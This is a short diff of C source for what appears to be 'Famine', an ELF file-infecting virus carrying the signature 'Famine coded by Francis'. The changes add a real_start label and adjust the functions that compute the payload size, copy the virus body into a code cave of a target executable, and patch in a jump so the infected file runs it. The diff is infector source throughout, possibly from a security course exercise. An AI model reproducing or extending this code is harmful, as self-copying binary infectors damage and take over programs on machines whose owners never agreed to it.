@@ -22,18 +22,14 @@ void famine(void);
 #define JMP_OFFSET 0x6
 #define JMP_SIZE 4
 
-void __attribute__((naked)) _start(void)
+void	_start(void)
 {
-	__asm__ ("call famine\n"
+	__asm__ (".global real_start\n"
+			"real_start:\n"
+			"call famine\n"
 			"jmp end\n"
 			"signature:\n"
 			".ascii \"Famine coded by Francis\\n\\0\"\n");
-	//__asm__ (".global real_start\n"
-	//		"real_start:\n"
-	//		"call famine\n"
-	//		"jmp end\n"
-	//		"signature:\n"
-	//		".ascii \"Famine coded by Francis\\n\\0\"\n");
 
 }
 
@@ -76,7 +72,7 @@ static int	calculate_jmp(t_data *data) {
 
 static int	inject(t_data *data) {
 	
-	unsigned long size = (unsigned long)&end - (unsigned long)&_start;
+	unsigned long size = (unsigned long)&end - (unsigned long)&real_start;
 
 	if (bss(data, size) == 1) {
 		return 1;
@@ -84,7 +80,7 @@ static int	inject(t_data *data) {
 
 	calculate_jmp(data);
 
-	ft_memcpy(data->file + data->cave.offset, &_start, size);
+	ft_memcpy(data->file + data->cave.offset, &real_start, size);
 
 	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);
 
@@ -97,7 +93,7 @@ static int	infect(const char *filename)
 	t_data data;
 	ft_memset(&data, 0, sizeof(t_data));
 
-	data.payload_size = (unsigned long)&end - (unsigned long)&_start;
+	data.payload_size = (unsigned long)&end - (unsigned long)&real_start;
 
 	if (map_file(filename, &data) != 0) {
 		return 1;
